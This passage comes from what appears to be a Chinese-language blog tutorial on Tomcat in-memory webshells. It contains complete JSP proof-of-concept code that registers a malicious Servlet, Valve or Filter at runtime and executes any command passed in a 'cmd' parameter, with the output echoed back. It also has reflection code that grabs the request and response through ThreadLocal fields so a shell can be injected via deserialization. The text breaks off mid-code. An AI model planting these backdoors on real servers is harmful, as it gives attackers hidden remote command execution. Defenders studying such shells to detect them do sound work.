class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br> <br>&lt;%<span class="hljs-comment">//得到StandardContext对象</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br>%&gt;<br> <br>&lt;%!<br> <span class="hljs-comment">//恶意Servlet</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Servlet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Servlet</span> &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest req, ServletResponse res)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd !=<span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                    e.printStackTrace();<br>                &#125;<span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        &#125;<br>    &#125;<br> <br>%&gt;<br> <br>&lt;%<span class="hljs-comment">//创建StandardWrapper并设置对应属性</span><br>    <span class="hljs-type">Shell_Servlet</span> <span class="hljs-variable">shell_servlet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Servlet</span>();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> shell_servlet.getClass().getSimpleName();<br> <br>    <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> standardContext.createWrapper();<br>    wrapper.setLoadOnStartup(<span class="hljs-number">1</span>);<span class="hljs-comment">//不能小于0</span><br>    wrapper.setName(name);<br>    wrapper.setServlet(shell_servlet);<br>    wrapper.setServletClass(shell_servlet.getClass().getName());<br>%&gt;<br> <br>&lt;%<span class="hljs-comment">//绑定路由</span><br>    standardContext.addChild(wrapper);<br>    standardContext.addServletMappingDecoded(<span class="hljs-string">&quot;/shell&quot;</span>,name);<br>%&gt;<br></code></pre></td></tr></table></figure><p>先注册Servlet</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost:8080/Java_Shell_war_exploded/Servlet.jsp<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010647020.png" alt="image-20230201064710941"></p><blockquote><p>Servlet型内存马的缺点就是必须要访问对应的路径才能命令执行，易被发现。</p></blockquote><h3 id="Valve型"><a href="#Valve型" class="headerlink" title="Valve型"></a>Valve型</h3><p>需要先了解一下tomcat中的管道机制</p><p>Tomcat 在处理一个请求调用逻辑时需要传递Request 和 Respone 对象，Tomcat 使用了职责链模式来实现客户端请求的处理。在 Tomcat 中定义了两个接口：Pipeline（管道）和 Valve（阀）。这两个接口名字很好的诠释了处理模式：数据流就像是流经管道的水一样，经过管道上个一个个阀门。</p><p>Pipeline 中会有一个最基础的 Valve（basic），它始终位于末端（最后执行），封装了具体的请求处理和输出响应的过程。Pipeline 提供了 <code>addValve</code> 方法，可以添加新 Valve 在 basic 之前，并按照添加顺序执行。</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010646623.png" alt="image-20230201064647521"></p><blockquote><p>在Tomcat中，四大组件Engine、Host、Context以及Wrapper都有其对应的Valve类，StandardEngineValve、StandardHostValve、StandardContextValve以及StandardWrapperValve，他们同时维护一个StandardPipeline实例。</p></blockquote><h4 id="动态添加Valve"><a href="#动态添加Valve" class="headerlink" title="动态添加Valve"></a>动态添加Valve</h4><p>先来简单看一下接口的定义，<code>org.apache.catalina.Pipeline</code> 的定义如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Pipeline</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Contained</span> &#123;<br>    <span class="hljs-keyword">public</span> Valve <span class="hljs-title function_">getBasic</span><span class="hljs-params">()</span>;<span class="hljs-comment">//获取基础阀门</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBasic</span><span class="hljs-params">(Valve valve)</span>;<span class="hljs-comment">//设置基础阀门</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addValve</span><span class="hljs-params">(Valve valve)</span>;<span class="hljs-comment">//增加阀门*</span><br>    <span class="hljs-keyword">public</span> Valve[] getValves();<span class="hljs-comment">//获取</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeValve</span><span class="hljs-params">(Valve valve)</span>;<span class="hljs-comment">//移除</span><br>    <span class="hljs-keyword">public</span> Valve <span class="hljs-title function_">getFirst</span><span class="hljs-params">()</span>;<span class="hljs-comment">//获取首个</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAsyncSupported</span><span class="hljs-params">()</span>;<span class="hljs-comment">//是否支持异步*</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">findNonAsyncValves</span><span class="hljs-params">(Set&lt;String&gt; result)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>org.apache.catalina.Valve</code> 的定义如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Valve</span> &#123;<br>    <span class="hljs-keyword">public</span> Valve <span class="hljs-title function_">getNext</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNext</span><span class="hljs-params">(Valve valve)</span>;<span class="hljs-comment">//设置下一个阀门</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">backgroundProcess</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span><span class="hljs-keyword">throws</span> IOException, ServletException;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAsyncSupported</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Tomcat 中 Pipeline 仅有一个实现 StandardPipeline，存放在 ContainerBase 的 pipeline 属性中，并且 ContainerBase 提供 <code>addValve</code> 方法调用 StandardPipeline 的 addValve 方法添加。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addValve</span><span class="hljs-params">(Valve valve)</span> &#123;<br>    <span class="hljs-keyword">if</span> (valve <span class="hljs-keyword">instanceof</span> Contained) &#123;<br>        ((Contained) valve).setContainer(<span class="hljs-built_in">this</span>.container);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (getState().isAvailable()) &#123;<br>        <span class="hljs-keyword">if</span> (valve <span class="hljs-keyword">instanceof</span> Lifecycle) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                ((Lifecycle) valve).start();<br>            &#125; <span class="hljs-keyword">catch</span> (LifecycleException e) &#123;<br>                log.error(sm.getString(<span class="hljs-string">&quot;standardPipeline.valve.start&quot;</span>), e);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (first == <span class="hljs-literal">null</span>) &#123;<br>        first = valve;<br>        valve.setNext(basic);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">Valve</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> first;<br>        <span class="hljs-keyword">while</span> (current != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">if</span> (current.getNext() == basic) &#123;<br>                current.setNext(valve);<br>                valve.setNext(basic);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            current = current.getNext();<br>        &#125;<br>    &#125;<br><br>    container.fireContainerEvent(Container.ADD_VALVE_EVENT, valve);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>Tomcat 中四个层级的容器都继承了 ContainerBase ，所以在哪个层级的容器的标准实现上添加自定义的 Valve 均可。</p></blockquote><p>添加后，将会在 <code>org.apache.catalina.connector.CoyoteAdapter</code> 的 <code>service</code> 方法中调用 Valve 的 <code>invoke</code> 方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(org.apache.coyote.Request req, org.apache.coyote.Response res)</span><br>        <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">//...</span><br>        postParseSuccess = postParseRequest(req, request, res, response);<br>        <span class="hljs-keyword">if</span> (postParseSuccess) &#123;<br>            request.setAsyncSupported(<br>                    connector.getService().getContainer().getPipeline().isAsyncSupported());<br>            connector.getService().getContainer().getPipeline().getFirst().invoke(<br>                    request, response);<span class="hljs-comment">//调用invoke</span><br></code></pre></td></tr></table></figure><p>这样思路就很清晰了，我们只要写一个恶意Valve为了方便可以继承<code>ValveBase</code>，然后将恶意代码写在invoke方法中,之后只要先通过<code>StandardContext</code>对象获取<code>StandardPipeline</code>，这样就可以利用<code>StandardPipeline.addValve()</code>动态添加Valve</p><h4 id="完整POC-2"><a href="#完整POC-2" class="headerlink" title="完整POC"></a>完整POC</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Pipeline&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br> <br>&lt;%<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br> <br>    <span class="hljs-type">Pipeline</span> <span class="hljs-variable">pipeline</span> <span class="hljs-operator">=</span> standardContext.getPipeline();<br>%&gt;<br> <br>&lt;%!<br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Valve</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ValveBase</span> &#123;<br> <br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd !=<span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                    e.printStackTrace();<br>                &#125;<span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>%&gt;<br> <br>&lt;%<br>    <span class="hljs-type">Shell_Valve</span> <span class="hljs-variable">shell_valve</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Valve</span>();<br>    pipeline.addValve(shell_valve);<br>%&gt;<br></code></pre></td></tr></table></figure><p>加载Valve</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost:8080/Java_Shell_war_exploded/Valve.jsp<br></code></pre></td></tr></table></figure><p>之后可以任意路径命令执行</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010705853.png" alt="image-20230201070553758"></p><h2 id="0x02-内存马回显技术"><a href="#0x02-内存马回显技术" class="headerlink" title="0x02 内存马回显技术"></a>0x02 内存马回显技术</h2><h3 id="回显示例"><a href="#回显示例" class="headerlink" title="回显示例"></a>回显示例</h3><p>可以利用之前的Tomcat Filter型内存马获取回显,修改一下恶意Filter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%! <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Filter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        response.setContentType(<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>);<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>        <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();<br> <br>                <span class="hljs-comment">//将命令执行结果写入扫描器并读取所有输入</span><br>                <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> scanner.hasNext()?scanner.next():<span class="hljs-string">&quot;&quot;</span>;<br>                scanner.close();<br>                writer.write(result);<br>                writer.flush();<br>                writer.close();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                n.printStackTrace();<br>            &#125;<br>        &#125;<br>        chain.doFilter(request, response);<br>    &#125;<br>&#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010710660.png" alt="image-20230201071005531"></p><h3 id="ThreadLocal-Response回显"><a href="#ThreadLocal-Response回显" class="headerlink" title="ThreadLocal Response回显"></a>ThreadLocal Response回显</h3><p>实验环境:Tomcat 9.0.77 (Tomcat10后部分源码逻辑修改,以及一些反射使用会报NullPointerException)</p><p>如果用Tomcat的内存马，需要JSP文件，当我们需要反序列化漏洞来注入内存马是，需要其他的方法获取request和response对象。</p><p>首先要注意的是，我们寻找的request对象应该是一个和当前线程ThreadLocal有关的对象，而不是一个全局变量。这样才能获取到当前线程的相关信息。最终我们能够在<code>org.apache.catalina.core.ApplicationFilterChain</code>类中找到这样两个变量*<code>lastServicedRequest</code><em>和</em><code>lastServicedResponse</code>*。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ApplicationFilterChain</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">FilterChain</span> &#123;<br><br>    <span class="hljs-comment">// Used to enforce requirements of SRV.8.2 / SRV.14.2.5.1</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;();<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;();<br></code></pre></td></tr></table></figure><blockquote><p>并且这两个属性还是静态的,默认赋值</p></blockquote><p>在<code>ApplicationFilterChain#internalDoFilter</code>中，Tomcat会将request对象和response对象存储到这两个变量中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">internalDoFilter</span><span class="hljs-params">(ServletRequest request,ServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;<br>    lastServicedRequest.set(request);<br>    lastServicedResponse.set(response);<br>&#125;<br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><blockquote><p>这里有一个条件<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>,默认值为false，但可以反射修改</p></blockquote><p>总结一下思路</p><ol><li>反射修改<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>的值，通过<code>ThreadLocal#set</code>方法将request和response对象存储到变量中</li><li>初始化<code>lastServicedRequest</code>和<code>lastServicedResponse</code>两个变量，默认为null</li><li>通过<code>ThreadLocal#get</code>方法将request和response对象从*<code>lastServicedRequest</code><em>和</em><code>lastServicedResponse</code>*中取出</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;<br> <br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.ServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<br> <br><span class="hljs-meta">@WebServlet(&quot;/echo&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Tomcat_Echo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br> <br>        <span class="hljs-keyword">try</span> &#123;<br> <br>            <span class="hljs-comment">//反射获取所需属性</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">WRAP_SAME_OBJECT_FIELD</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;WRAP_SAME_OBJECT&quot;</span>);<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">lastServicedRequestField</span> <span class="hljs-operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="hljs-string">&quot;lastServicedRequest&quot;</span>);<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">lastServicedResponseField</span> <span class="hljs-operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="hljs-string">&quot;lastServicedResponse&quot;</span>);<br> <br>            <span class="hljs-comment">//使用modifiersField反射修改final型变量</span><br>            java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">modifiersField</span> <span class="hljs-operator">=</span> Field.class.getDeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>);<br>            modifiersField.setAccessible(<span class="hljs-literal">true</span>);<br>            modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL);<br>            modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~Modifier.FINAL);<br>            modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~Modifier.FINAL);<br>            WRAP_SAME_OBJECT_FIELD.setAccessible(<span class="hljs-literal">true</span>);<br>            lastServicedRequestField.setAccessible(<span class="hljs-literal">true</span>);<br>            lastServicedResponseField.setAccessible(<span class="hljs-literal">true</span>);<br> <br>            <span class="hljs-comment">//将变量WRAP_SAME_OBJECT_FIELD设置为true，并初始化lastServicedRequest和lastServicedResponse变量</span><br>            <span class="hljs-keyword">if</span> (!WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="hljs-literal">null</span>))&#123;<br>                WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="hljs-literal">null</span>,<span class="hljs-literal">true</span>);<br>            &#125;<br> <br>            <span class="hljs-keyword">if</span> (lastServicedRequestField.get(<span class="hljs-literal">null</span>)==<span class="hljs-literal">null</span>)&#123;<br>                lastServicedRequestField.set(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;());<br>            &#125;<br> <br>            <span class="hljs-keyword">if</span> (lastServicedResponseField.get(<span class="hljs-literal">null</span>)==<span class="hljs-literal">null</span>)&#123;<br>                lastServicedResponseField.set(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;());<br>            &#125;<br> <br>            <span class="hljs-comment">//获取request变量</span><br>            <span class="hljs-keyword">if</span>(lastServicedRequestField.get(<span class="hljs-literal">null</span>)!=<span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-type">ThreadLocal</span> <span class="hljs-variable">threadLocal</span> <span class="hljs-operator">=</span> (ThreadLocal) lastServicedRequestField.get(<span class="hljs-literal">null</span>);<br>                <span class="hljs-type">ServletRequest</span> <span class="hljs-variable">servletRequest</span> <span 